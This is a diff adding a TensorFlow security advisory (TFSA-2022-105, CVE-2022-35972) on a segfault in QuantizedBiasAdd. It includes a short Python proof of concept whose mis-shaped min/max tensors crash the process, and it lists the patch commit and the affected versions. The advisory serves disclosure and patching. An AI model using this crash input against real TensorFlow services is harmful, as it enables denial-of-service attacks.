@@ -1,0 +1,23 @@
+<h2>TFSA-2022-105: Segfault in <code>QuantizedBiasAdd</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2022-35972</p>
+<h3>Impact</h3>
+<p>If <code>QuantizedBiasAdd</code> is given <code>min_input</code>, <code>max_input</code>, <code>min_bias</code>, <code>max_bias</code> tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.
+```python
+import tensorflow as tf</p>
+<p>out_type = tf.qint32
+input = tf.constant([85,170,255], shape=[3], dtype=tf.quint8)
+bias = tf.constant(43, shape=[2,3], dtype=tf.quint8)
+min_input = tf.constant([], shape=[0], dtype=tf.float32)
+max_input = tf.constant(0, shape=[1], dtype=tf.float32)
+min_bias = tf.constant(0, shape=[1], dtype=tf.float32)
+max_bias = tf.constant(0, shape=[1], dtype=tf.float32)
+tf.raw_ops.QuantizedBiasAdd(input=input, bias=bias, min_input=min_input, max_input=max_input, min_bias=min_bias, max_bias=max_bias, out_type=out_type)
+```</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0">785d67a78a1d533759fcd2f5e8d6ef778de849e0</a>.</p>
+<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.</p>
